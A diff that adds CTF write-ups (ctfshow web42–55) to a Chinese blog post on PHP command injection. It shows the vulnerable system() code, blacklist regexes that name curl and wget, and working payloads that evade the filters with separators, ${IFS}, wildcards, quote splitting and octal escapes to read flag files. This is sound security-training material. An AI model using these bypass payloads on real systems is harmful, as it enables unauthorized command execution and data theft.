@@ -3,7 +3,7 @@ title: "ctfshow-WEB入门（命令执行）"
 description: "ctfshow-WEB入门（命令执行）"
 image: "/assets/西施2.jpg"
 date: 2026-11-05
-updated: 2026-11-06
+updated: 2026-11-07
 categories:
   - 学习
 tags:
@@ -1695,3 +1695,589 @@ print(r.text)
 #### Q3：为什么不能直接用浏览器地址栏？
 
 > 地址栏只能发 **GET**，参数会拼在 URL 的 `?` 后面；而 web41 读的是 `$_POST['c']`，GET 传不进去。想在浏览器里发 POST，只能在页面里写一个 `<form method="post">` 来提交——比用 Burp/HackBar 麻烦，不推荐。
+
+### web42
+
+![image-20261107093430395](/assets/ctfshow-web-command-exec/image-20261107093430395.png)
+
+**代码把我们的输出“扔进垃圾桶”了**
+
+```php
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    system($c." >/dev/null 2>&1");
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+- 没有过滤，`c` 直接进 `system()`
+- 但后面**硬拼了 ` >/dev/null 2>&1`**
+
+#### Q1：`>/dev/null 2>&1` 是什么？
+
+| 部分 | 意思 |
+| :--- | :--- |
+| `>` | 重定向标准输出（stdout，fd=1） |
+| `/dev/null` | Linux 的“黑洞”文件，写进去的内容全部丢弃 |
+| `2>&1` | 把标准错误（stderr，fd=2）也重定向到 stdout |
+
+合起来：**这条命令的所有输出（正常输出 + 报错）都被丢掉了**，页面上什么都看不到。
+
+所以直接传 `cat flag.php`，实际执行的是：
+
+```bash
+cat flag.php >/dev/null 2>&1
+```
+
+输出全进黑洞 → 页面空白。
+
+#### 绕过：用 `;` 把命令“截断”
+
+```
+?c=tac flag.php;
+```
+
+拼起来变成：
+
+```bash
+tac flag.php; >/dev/null 2>&1
+```
+
+![image-20261107095040501](/assets/ctfshow-web-command-exec/image-20261107095040501.png)
+
+- `;` 是 shell 的**命令分隔符**，前面 `tac flag.php` 是第一条命令
+- 后面 `>/dev/null 2>&1` 成了第二条“空命令”，只做重定向，什么都不输出
+- 于是 `tac` 的输出正常回显
+
+#### 其他等价写法
+
+```
+?c=tac flag.php;      ← 分号
+?c=tac flag.php &&    ← 前一条成功才执行后面的空重定向，无害
+?c=tac flag.php ||    ← 前一条成功就跳过后面
+?c=tac flag.php %23   ← # 注释掉后面的重定向（# 必须编码成 %23）
+?c=tac flag.php%0a    ← 换行，效果同分号
+```
+
+### web43
+
+![image-20261107093415043](/assets/ctfshow-web-command-exec/image-20261107093415043.png)
+
+**在 web42 基础上封了 `;` 和 `cat`**
+
+```php
+if(!preg_match("/\;|cat/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 过滤：分号 `;`、`cat`（不区分大小写）
+- 重定向还是那个 `>/dev/null 2>&1`
+
+#### 两个封杀点怎么绕
+
+| 被封 | 替代 |
+| :--- | :--- |
+| `cat` | `tac`、`nl`、`head`、`tail`、`more` |
+| `;` | `&&`、`\|\|`、`#`、换行 `%0a` |
+
+#### 可用的 payload
+
+```
+?c=tac flag.php ||
+?c=tac flag.php &&
+?c=tac flag.php %23
+```
+
+![image-20261107095740391](/assets/ctfshow-web-command-exec/image-20261107095740391.png)
+
+三条都直接出 flag。
+
+为什么能行：
+
+- `tac flag.php || >/dev/null 2>&1`：`tac` 执行成功（退出码 0），`||` 后面的不执行 → 输出保留
+- `tac flag.php && >/dev/null 2>&1`：`tac` 成功后执行后面那个“只有重定向的空命令” → 无害
+- `tac flag.php # >/dev/null 2>&1`：`#` 之后全被注释掉 → 重定向消失。注意浏览器里 `#` 要写成 `%23`，否则会被当成 URL 锚点，根本不会发到服务器
+
+#### 两题共用一套思路
+
+| | web42 | web43 |
+| :--- | :--- | :--- |
+| 过滤 | 无 | `;`、`cat` |
+| 核心障碍 | 追加的 `>/dev/null 2>&1` | 同左 + 两个禁词 |
+| 关键解法 | `;` 截断 | `\|\|` / `&&` / `#` 截断；`tac` 代替 `cat` |
+
+只要能让“我们自己的命令”和“追加的重定向”**分开成两条命令**，输出就不会被吞。
+
+### web44
+
+![image-20261107100127874](/assets/ctfshow-web-command-exec/image-20261107100127874.png)
+
+**在 web43 基础上又封了 `flag`**
+
+```php
+if(!preg_match("/;|cat|flag/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 过滤：`;`、`cat`、`flag`（不区分大小写）
+- 重定向还是 `>/dev/null 2>&1`
+
+#### 三个封杀点
+
+| 被封 | 替代 |
+| :--- | :--- |
+| `;` | `&&`、`\|\|`、`#`（URL 里写 `%23`）、`%0a` |
+| `cat` | `tac`、`nl`、`head`、`tail`、`more`、`less`、`od`、`grep`、`sort`、`uniq` |
+| `flag` | `fla*`、`f*`、`fl?g` |
+
+#### 可用的 payload
+
+```
+?c=ls||
+?c=tac fla*||
+?c=tac fla*&&
+?c=tac fla* %23
+```
+
+#### 原理：
+
+- `tac fla*||` 拼成 `tac fla*|| >/dev/null 2>&1`：`||` 后面是一条空的重定向命令，`tac` 成功时右侧不执行 → 输出保留
+- `&&` 同理：`tac` 成功后执行右侧的“空命令”，无害
+- `#` 直接把追加的重定向注释掉（浏览器里要写 `%23`）
+- `fla*` 让 `flag` 四个字母不连续出现，绕过 `flag` 过滤
+
+### web45
+
+![image-20261107100145305](/assets/ctfshow-web-command-exec/image-20261107100145305.png)
+
+**再封掉空格**
+
+```php
+if(!preg_match("/\;|cat|flag| /i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 过滤：`;`、`cat`、`flag`、**空格**
+- 这里挡的是正则里的字面空格（0x20）
+
+#### Q1:空格可以用什么替代？
+
+| 写法 | 说明 |
+| :--- | :--- |
+| `%09` | Tab（制表符），shell 同样当分隔符 |
+| `${IFS}` | shell 内置变量，值是「空格 + Tab + 换行」 |
+| `$IFS$9` | 同理，`$9` 是空参数，用来断开变量名 |
+
+**注意**：`$IFS` 后面直接跟 `fla*` 会被当成变量名 `IFSfla`，要写成 `${IFS}` 或 `$IFS$9`。
+
+#### 可用的 payload
+
+```
+?c=tac%09fla*||
+?c=tac${IFS}fla*||
+```
+
+#### 原理
+
+- 拼接后是 `tac<Tab>fla*|| >/dev/null 2>&1`
+- Tab 在 shell 里当空白，`tac` 和 `fla*` 正常分开
+- `||` 让追加的重定向变成独立的空命令
+
+### web46
+
+![image-20261107101455838](/assets/ctfshow-web-command-exec/image-20261107101455838.png)
+
+**又封了：空格、数字、`$`、`*`**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 过滤：`;`、`cat`、`flag`、空格、数字 `[0-9]`、`$`、`*`
+- 注意 `\\$` 在正则里是字面 `$`，`\*` 是字面 `*`
+
+**前面常用的几招都被堵住了：**
+
+| 想用 | 不行 |
+| :--- | :--- |
+| `${IFS}` / `$IFS$9` | `$` 被封 |
+| `fla*` / 任何 `*` | `*` 被封 |
+| `cat fla*` | `cat`、空格都被封 |
+| `;` 截断 | `;` 被封（改用 `\|\|`、`&&`、`#`） |
+
+#### 两个替代
+
+**空格 → `%09`（Tab）**：`$` 被封，`${IFS}` 用不了，但 Tab 还能用。
+
+**文件名 → `?` 通配符**：`*` 被封，但 `?` 还能用；`fla?.php` 匹配 `flag.php`，而且字符串里没有连续的 `flag`：
+
+- `fla?.php` → `fla` + 任意一个字符 + `.php` → `flag.php`
+- 同类写法：`?lag.php`、`fl[a]g.php`
+
+#### 可用的 payload
+
+```
+?c=ls||
+?c=tac%09fla?.php||
+```
+
+#### 原理
+
+- `%09` 解码成 Tab，shell 把它当空白
+- `fla?.php` 在 shell 里展开成 `flag.php`
+- `||` 让追加的 `>/dev/null 2>&1` 变成独立空命令
+
+### web47
+
+![image-20261107101517252](/assets/ctfshow-web-command-exec/image-20261107101517252.png)
+
+**在 web46 基础上又封了 5 个读文件命令**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 过滤：web46 的全部 + `more`、`less`、`head`、`sort`、`tail`
+
+#### Q1：还能用哪些什么命令执行？
+
+被封的都是“分页/排序”类命令，但 `tac`、`nl`、`od`、`grep`、`awk`、`sed`、`rev`、`paste`、`base64` 都还能用。
+
+所以 **web46 的 payload 原样可用**：
+
+```
+?c=tac%09fla?.php||
+?c=nl%09fla?.php||
+```
+
+#### 原理
+
+和 web46 完全一样：Tab 当空格、`?` 当通配符、`||` 截断重定向。`tac` 和 `nl` 都不在封禁名单里，所以直接读出来了。
+
+这题只是“多封了几个命令”，思路没变——换一个没被封的读文件命令就行。
+
+### web48
+
+![image-20261107103056447](/assets/ctfshow-web-command-exec/image-20261107103056447.png)
+
+**又封了 7 个命令 + 反引号**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 在 web47 基础上又封：`sed`、`cut`、`awk`、`strings`、`od`、`curl`、反引号
+- **注意：`tac`、`nl` 没有被封**
+
+#### 直接用上一题的 payload
+
+```
+?c=tac%09fla?.php||
+?c=nl%09fla?.php||
+```
+
+两条都直接出 flag。
+
+#### 原理
+
+封的是一堆“文本处理 / 下载”类命令，但 `tac`（倒序输出）和 `nl`（带行号输出）都不在名单里。所以思路完全不变：Tab 当空格、`?` 当通配符、`||` 截断重定向。
+
+### web49
+
+![image-20261107103040545](/assets/ctfshow-web-command-exec/image-20261107103040545.png)
+
+**在 web48 基础上再封一个 `%`**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 过滤：web48 的全部 + `%`
+
+#### Q1：为什么 `%09` 还能用？
+
+这里有个容易误解的点：**过滤发生在 URL 解码之后**。
+
+- 你提交的是 `%09`
+- PHP 取到 `$_GET['c']` 时，`%09` 已经被解码成了 **Tab 字符**
+- 正则里的 `%` 检查的是“解码后的字符串里有没有百分号”，而此时 `c` 里已经没有 `%` 了，只有 Tab
+
+所以上一题的 payload 依旧有效：
+
+```
+?c=tac%09fla?.php||
+?c=nl%09fla?.php||
+```
+
+> 什么时候 `%` 过滤才有用？只有当你提交 `%25`（解码后变成字面 `%`），或者命令里直接写百分号时，才会命中。
+
+#### 原理
+
+同 web48，只是多了个 `%` 的干扰项。关键是分清“原始输入”和“解码后的值”——**过滤器看的是解码后的值**。
+
+### web50
+
+![image-20261107104750154](/assets/ctfshow-web-command-exec/image-20261107104750154.png)
+
+**这次连 Tab 和 `&` 都封了**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 在 web49 基础上新增：`\x09`（Tab）、`\x26`（`&`）
+- 也就是说：空格、Tab、`${IFS}`、`&&` 全都不行了
+
+#### 还剩什么
+
+| 想用 | 状态 |
+| :--- | :--- |
+| 空格 / Tab | 都被封 |
+| `${IFS}` / `$IFS$9` | `$` 被封 |
+| `&&` | `&` 被封 |
+| `\|\|` | 还能用 |
+| `<` 输入重定向 | 能用，而且不需要空格 |
+
+#### 思路：用 `<` 代替空格
+
+`命令<文件` 会把文件内容喂给命令，中间不需要空格。
+
+但有个坑：**`<` 后面的通配符 `fla?.php` 不会展开**（容器的 `/bin/sh` 是 dash，重定向目标不做 glob 展开），会报“文件不存在”。
+
+所以文件名要写成**字面量**，但又不能出现连续的 `flag`。两个办法：
+
+```
+?c=tac<fla\g.php||     ← 反斜杠：shell 去掉 \，还原成 flag.php
+?c=tac<"fla""g.php"||  ← 引号拼接：相邻字符串自动连成 flag.php
+```
+
+> 正则看到的是 `fla\g.php` / `"fla""g.php"`，里面没有连续的 `flag`；shell 解析时再把它们还原成 `flag.php`。
+
+#### 为什么最后要 `||`
+
+代码会在末尾拼 ` >/dev/null 2>&1`。`||` 让这段重定向变成**另一条命令**，我们自己的 `tac` 输出才不会被吞。
+
+
+
+
+
+### web51
+
+![image-20261107104728554](/assets/ctfshow-web-command-exec/image-20261107104728554.png)
+
+**再封一个 `tac`**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 在 web50 基础上多封了 `tac`
+
+#### 换个没被封的读文件命令
+
+`nl`、`rev`、`paste` 都还能用，`<` + 反斜杠的技巧完全一样：
+
+```
+?c=nl<fla\g.php||
+?c=rev<fla\g.php||
+?c=paste<fla\g.php||
+```
+
+- `nl` 带行号输出（最直观）
+- `rev` 输出是整行倒序的，需要自己反过来读
+- `paste` 原样输出
+
+#### 为什么能行
+
+- `<` 把 `flag.php` 喂给命令，不需要空格
+- `fla\g.php` 绕过 `flag` 过滤
+- `||` 把追加的重定向变成独立命令
+
+### web52
+
+![image-20261107110333367](/assets/ctfshow-web-command-exec/image-20261107110333367.png)
+
+**过滤大改：放开 `$`，但封了 `<` `>`**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+    system($c." >/dev/null 2>&1");
+}
+```
+
+- 和 web51 相比：**去掉了 `$` 的过滤**，但**新增 `>` 和 `<`**
+- 也就是：`${IFS}` 复活了，但 `<` 重定向不能用了
+
+#### 思路：回到 `${IFS}` + `?` 通配符
+
+- 空格仍被封 → `${IFS}` 代替（`$` 不再被封）
+- `*` 仍被封 → `?` 通配符（这次是普通参数，dash 会正常展开）
+- `tac` 仍被封 → `nl` / `rev` / `paste`
+- `<` `>` 被封 → 不能用重定向，只能走“命令 + 参数”的老路
+- `||` 还能用 → 截断后面追加的 `>/dev/null 2>&1`
+
+#### payload
+
+```
+?c=nl${IFS}fla?.php||
+?c=rev${IFS}fla?.php||
+?c=paste${IFS}fla?.php||
+```
+
+#### 注意：flag.php 里是假的
+
+这题的 `flag.php` 内容是 `$flag="flag_here";`，占位符而已，真 flag 在根目录 `/flag`。
+
+先看根目录：
+
+```
+?c=ls${IFS}/||
+```
+
+根目录里有个 `flag` 文件，但 `flag` 这个词被过滤，不能直接写。用 `?` 绕：
+
+```
+?c=nl${IFS}/fla?||
+```
+
+`/fla?` 匹配 `/flag`，字符串里没有连续的 `flag`，成功读出真 flag。
+
+
+
+### web53
+
+![image-20261107110352983](/assets/ctfshow-web-command-exec/image-20261107110352983.png)
+
+**没有追加重定向了，直接回显**
+
+```php
+if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+    echo($c);
+    $d = system($c);
+    echo "<br>".$d;
+}
+```
+
+- 和 web52 比：多封了 `wget`；**`system($c)` 后面不再拼 `>/dev/null 2>&1`**
+- 所以不需要 `||` 截断了，命令输出直接进页面（先 echo 你的 payload，再 `<br>`，再执行结果）
+
+#### payload
+
+```
+?c=nl${IFS}fla?.php
+```
+
+#### 注意
+
+- 目录里除了 `flag.php`、`index.php`，还有一个 `readflag` 文件；但 `readflag` 里含 `flag`，直接写会返回 `no`
+- 想执行它可以用 `./readfla?`（`?` 通配），不过实测没有输出；拿 flag 直接用 `nl` 读 `flag.php` 就行
+
+### web54
+
+![image-20261107122536791](/assets/ctfshow-web-command-exec/image-20261107122536791.png)
+
+**过滤升级成“子序列匹配”**
+
+```php
+if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
+    system($c);
+}
+```
+
+关键变化：
+
+- 命令名不再按“整词”匹配，而是 `.*c.*a.*t.*` 这种**子序列**匹配——只要字符串里出现 c，后面再出现 a，再后面出现 t，就算命中
+- **不再追加 `>/dev/null 2>&1`**，`system($c)` 直接回显
+- 空格、Tab、`&`、`<` `>`、数字、`*`、反引号、`%` 仍然被封
+
+被封的常用词（按子序列）：cat、flag、more、wget、less、head、sort、tail、sed、cut、tac、awk、strings、od、curl、nl、scp、rm。
+
+#### 能用哪些东西？
+
+| 命令 | 为什么能过 |
+| :--- | :--- |
+| `paste` | p-a-s-t-e，不满足任何子序列模式 |
+| `rev` | r-e-v，也不满足 |
+| `ls` / `cp` / `grep` / `find` | 同样不在名单里 |
+
+- `$` 没被封 → `${IFS}` 当空格
+- 这次没有追加重定向 → 不需要 `||`
+
+#### payload
+
+```
+?c=ls
+?c=paste${IFS}fla?.php
+?c=rev${IFS}fla?.php
+```
+
+`fla?.php` 里的 `?` 替代了 `g`：既破坏了 `flag` 这个子串，也破坏了 `f…l…a…g` 这个子序列，所以能过。
+
+### web55
+
+![image-20261107122605841](/assets/ctfshow-web-command-exec/image-20261107122605841.png)
+
+**所有字母都封了**
+
+```php
+if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
+    system($c);
+}
+```
+
+- 封：`;`、所有字母（大小写）、反引号、`%`、Tab、`&`、`>`、`<`
+- **空格没封，数字没封，`$`、单引号、反斜杠也没封**
+
+#### 思路：用 ANSI-C 引号的八进制转义
+
+容器的 shell 支持 `$'\143'` 这种写法：`\143` 是八进制，等于字符 `c`。
+
+```
+$'\143\141\164'   →   cat
+```
+
+整个 payload 里只有 `$`、`'`、`\`、数字，没有一个字母。
+
+文件名用 `????.???` 通配：4 个字符 + 点 + 3 个字符 = `flag.php`（`index.php` 是 5 个字符，不匹配）。
+
+#### payload
+
+```
+?c=$'\143\141\164' ????.???
+```
+
+执行过程：
+
+1. 过滤看到 `$'\143\141\164' ????.???`，没有字母 → 放行
+2. shell 把 `$'...'` 按八进制还原成 `cat`
+3. `????.???` 展开成 `flag.php`
+4. 执行 `cat flag.php`
+
+#### 常用八进制对照
+
+| 字符 | 十进制 | 八进制 |
+| :--- | :--- | :--- |
+| c | 99 | \143 |
+| a | 97 | \141 |
+| t | 116 | \164 |
+| l | 108 | \154 |
+| s | 115 | \163 |
+| 空格 | 32 | \040 |
+
+> 顺带：`/???/???` 这种直接匹配命令名的写法也能用，但会一次匹配到多个（cat、sed…），变成“第一个当命令、其余当参数”，不可控；推荐用 `$'...'` 精确构造。
